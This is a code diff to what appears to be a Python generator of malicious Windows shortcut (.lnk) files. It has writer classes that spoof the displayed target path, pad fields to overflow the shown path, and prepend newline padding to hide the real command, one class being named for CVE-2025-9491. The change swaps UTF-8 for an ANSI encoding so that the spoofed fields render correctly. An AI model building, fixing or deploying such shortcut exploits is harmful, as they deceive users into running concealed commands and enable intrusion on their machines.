@@ -4,7 +4,7 @@ from abc import ABC, abstractmethod
 from dataclasses import dataclass
 
 from .byte_tools import ByteTools
-from .lnk_tools import ITEM, LINK_INFO, LINKTARGET_IDLIST, SHELL_LINK_HEADER
+from .lnk_tools import ITEM, LINK_INFO, LINKTARGET_IDLIST, SHELL_LINK_HEADER, ANSI_ENCODING
 
 
 @dataclass
@@ -60,7 +60,7 @@ class LnkWriterFakeTargetExe(LnkWriter):
         f.write(ByteTools.create_bytes(len(lnk.icon_path), 2) + lnk.icon_path.encode('utf-16le'))
         # EXTRA DATA
         f.write(ByteTools.create_bytes(0x00000314, 4) + ByteTools.create_bytes(0xA0000001, 4)
-                + lnk.fake_path.encode('utf-8') + ByteTools.create_bytes(0x00, 260-len(lnk.fake_path.encode('utf-8')))
+                + lnk.fake_path.encode(ANSI_ENCODING) + ByteTools.create_bytes(0x00, 260-len(lnk.fake_path.encode(ANSI_ENCODING)))
                 + lnk.fake_path.encode('utf-16le') + ByteTools.create_bytes(0x00, 520-len(lnk.fake_path.encode('utf-16le')))
                 + ByteTools.create_bytes(0x00, 4))
 
@@ -124,7 +124,7 @@ class LnkWriterOverflow(LnkWriter):
                 lnk.fake_path += '"'
             lnk.fake_path = lnk.fake_path.ljust(255, " ")
         f.write(ByteTools.create_bytes(0x00000314, 4) + ByteTools.create_bytes(0xA0000001, 4)
-                + lnk.fake_path.encode('utf-8') + ByteTools.create_bytes(0x00, 260-len(lnk.fake_path.encode('utf-8')))
+                + lnk.fake_path.encode(ANSI_ENCODING) + ByteTools.create_bytes(0x00, 260-len(lnk.fake_path.encode(ANSI_ENCODING)))
                 + lnk.fake_path.encode('utf-16le') + ByteTools.create_bytes(0x00, 520-len(lnk.fake_path.encode('utf-16le')))
                 + ByteTools.create_bytes(0x00, 4))
 
@@ -143,12 +143,12 @@ class LnkWriterFakeExeDisabled(LnkWriter):
         # LINKTARGET IDLIST
         f.write(LINKTARGET_IDLIST(LINKTARGET_IDLIST.path_to_idlist(lnk.fake_path)).write())
         if lnk.target_cmd:
-            f.write(ByteTools.create_bytes(len(lnk.target_cmd), 2) + lnk.target_cmd.encode('utf-8'))
+            f.write(ByteTools.create_bytes(len(lnk.target_cmd), 2) + lnk.target_cmd.encode(ANSI_ENCODING))
         # STRING DATA
-        f.write(ByteTools.create_bytes(len(lnk.icon_path), 2) + lnk.icon_path.encode('utf-8'))
+        f.write(ByteTools.create_bytes(len(lnk.icon_path), 2) + lnk.icon_path.encode(ANSI_ENCODING))
         # EXTRA DATA
         f.write(ByteTools.create_bytes(0x00000314, 4) + ByteTools.create_bytes(0xA0000001, 4)
-                + lnk.target_path.encode('utf-8') + ByteTools.create_bytes(0x00, 260-len(lnk.target_path.encode('utf-8')))
+                + lnk.target_path.encode(ANSI_ENCODING) + ByteTools.create_bytes(0x00, 260-len(lnk.target_path.encode(ANSI_ENCODING)))
                 + ''.encode('utf-16le') + ByteTools.create_bytes(0x00, 520)
                 + ByteTools.create_bytes(0x00, 4))
 
@@ -167,10 +167,10 @@ class LnkWriterCVE20259491(LnkWriter):
         # STRING DATA
         padding_characters = '\x0A\x0D'
         target_cmd = (padding_characters * (256//len(padding_characters))) + lnk.target_cmd
-        f.write(ByteTools.create_bytes(len(target_cmd), 2) + target_cmd.encode('utf-8'))
-        f.write(ByteTools.create_bytes(len(lnk.icon_path), 2) + lnk.icon_path.encode('utf-8'))
+        f.write(ByteTools.create_bytes(len(target_cmd), 2) + target_cmd.encode(ANSI_ENCODING))
+        f.write(ByteTools.create_bytes(len(lnk.icon_path), 2) + lnk.icon_path.encode(ANSI_ENCODING))
         # EXTRA DATA
         f.write(ByteTools.create_bytes(0x00000314, 4) + ByteTools.create_bytes(0xA0000001, 4)
-                + lnk.target_path.encode('utf-8') + ByteTools.create_bytes(0x00, 260-len(lnk.target_path.encode('utf-8')))
+                + lnk.target_path.encode(ANSI_ENCODING) + ByteTools.create_bytes(0x00, 260-len(lnk.target_path.encode(ANSI_ENCODING)))
                 + lnk.target_path.encode('utf-16le') + ByteTools.create_bytes(0x00, 520)
                 + ByteTools.create_bytes(0x00, 4))
